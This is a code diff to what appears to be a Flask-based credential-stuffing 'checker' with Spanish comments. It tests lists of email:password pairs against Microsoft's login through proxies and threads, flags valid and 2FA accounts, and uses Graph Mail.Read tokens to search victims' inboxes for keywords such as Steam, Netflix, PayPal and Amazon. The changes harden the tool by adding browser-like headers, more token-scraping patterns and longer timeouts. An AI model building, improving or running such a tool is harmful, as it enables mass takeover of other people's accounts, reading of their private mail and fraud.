@@ -10,16 +10,16 @@ from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 from flask import Flask, render_template, request, jsonify, send_file
 from flask_cors import CORS
+import tempfile
+import base64
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 CORS(app)
 
-# Configuración
 PORT = int(os.environ.get('PORT', 5000))
 
-# Estado global del checker
 checker_state = {
     'running': False,
     'stats': {
@@ -43,7 +43,7 @@ checker_state = {
 }
 
 # ============================================
-# CLASE MICROSOFT CHECKER (REAL)
+# CLASE MICROSOFT CHECKER
 # ============================================
 
 class MicrosoftChecker:
@@ -60,26 +60,30 @@ class MicrosoftChecker:
         self.name = 'Unknown'
     
     def get_login_data(self):
-        """Obtiene datos de login"""
         try:
             url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
             
             headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9'
             }
             
-            r = self.session.get(url, headers=headers, timeout=15)
+            r = self.session.get(url, headers=headers, timeout=20)
             text = r.text
             
-            # Buscar sFTTag
             sFTTag = None
-            match = re.search(r'name="PPFT".*?value="(.+?)"', text, re.S)
-            if not match:
-                match = re.search(r'sFTTag:\'(.+?)\'', text, re.S)
-            if match:
-                sFTTag = match.group(1)
+            patterns = [
+                r'name="PPFT".*?value="(.+?)"',
+                r'sFTTag:\'(.+?)\'',
+                r'sFTTag:"(.+?)"'
+            ]
+            for pattern in patterns:
+                match = re.search(pattern, text, re.S)
+                if match:
+                    sFTTag = match.group(1)
+                    break
             
-            # Buscar urlPost
             urlPost = None
             match = re.search(r'<form.*?action="(.+?)"', text, re.S)
             if match:
@@ -90,7 +94,6 @@ class MicrosoftChecker:
             return None, None
     
     def login(self):
-        """Intenta login"""
         urlPost, sFTTag = self.get_login_data()
         if not urlPost or not sFTTag:
             return 'ERROR'
@@ -109,17 +112,14 @@ class MicrosoftChecker:
             }
             
             r = self.session.post(urlPost, data=data, headers=headers, 
-                                 allow_redirects=True, timeout=15)
+                                 allow_redirects=True, timeout=20)
             
-            # Verificar éxito
             if '#' in r.url and 'access_token' in r.url:
                 return 'SUCCESS'
             
-            # Verificar 2FA
             if any(x in r.text for x in ['recover?mkt', 'identity/confirm', 'Abuse?mkt=']):
                 return '2FA'
             
-            # Verificar fallo
             if any(x in r.text.lower() for x in [
                 'password is incorrect',
                 "account doesn't exist",
@@ -132,7 +132,6 @@ class MicrosoftChecker:
             return 'ERROR'
     
     def get_graph_token(self):
-        """Obtiene token Graph API"""
         try:
             client_id = '0000000048170EF2'
             scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read'
@@ -145,7 +144,6 @@ class MicrosoftChecker:
             return None
     
     def get_profile(self):
-        """Obtiene perfil del usuario"""
         token = self.get_graph_token()
         if not token:
             return False
@@ -170,7 +168,6 @@ class MicrosoftChecker:
         return False
     
     def check_inbox(self):
-        """Busca keywords en el inbox"""
         token = self.get_graph_token()
         if not token:
             return 0, []
@@ -199,20 +196,17 @@ class MicrosoftChecker:
         
         return total, hits
 
-
 # ============================================
 # FUNCIONES DE PROCESAMIENTO
 # ============================================
 
 def parse_accounts(text):
-    """Parsea cuentas"""
     accounts = []
     for line in text.split('\n'):
         line = line.strip()
         if not line or '@' not in line:
             continue
         
-        # Probar separadores
         for sep in [':', '|', ';', ',', '\t']:
             if sep in line:
                 parts = line.split(sep, 1)
@@ -222,11 +216,9 @@ def parse_accounts(text):
     return accounts
 
 def parse_keywords(text):
-    """Parsea keywords"""
     return [line.strip() for line in text.split('\n') if line.strip() and not line.startswith('#')]
 
 def parse_proxies(text):
-    """Parsea proxies"""
     proxies = []
     for line in text.split('\n'):
         line = line.strip()
@@ -240,7 +232,6 @@ def parse_proxies(text):
     return proxies
 
 def add_log(message, level='info'):
-    """Añade log"""
     timestamp = datetime.now().strftime('%H:%M:%S')
     checker_state['logs'].insert(0, {
         'time': timestamp,
@@ -251,7 +242,6 @@ def add_log(message, level='info'):
         checker_state['logs'] = checker_state['logs'][:500]
 
 def check_account(email, password, keywords, proxies):
-    """Verifica una cuenta"""
     if not checker_state['running']:
         return
     
@@ -292,12 +282,10 @@ def check_account(email, password, keywords, proxies):
     
     finally:
         checker_state['stats']['checked'] += 1
-        # Actualizar CPM
         if checker_state['start_time']:
             elapsed = time.time() - checker_state['start_time']
             if elapsed > 0:
                 checker_state['stats']['cpm'] = int(checker_state['stats']['checked'] / elapsed * 60)
-
 
 # ============================================
 # RUTAS DE LA API
@@ -324,7 +312,6 @@ def start_checking():
     if not keywords:
         keywords = ['Steam', 'Netflix', 'PayPal', 'Amazon']
     
-    # Resetear estado
     checker_state['running'] = True
     checker_state['stats'] = {
         'valid': 0, 'inbox': 0, '2fa': 0, 'bad': 0,
@@ -339,7 +326,6 @@ def start_checking():
     add_log(f"📡 Proxies: {len(proxies)}", 'info')
     add_log(f"⚙️ Hilos: {threads}", 'info')
     
-    # Ejecutar en hilo separado
     thread = threading.Thread(target=run_checker, args=(accounts, keywords, proxies, threads))
     thread.daemon = True
     thread.start()
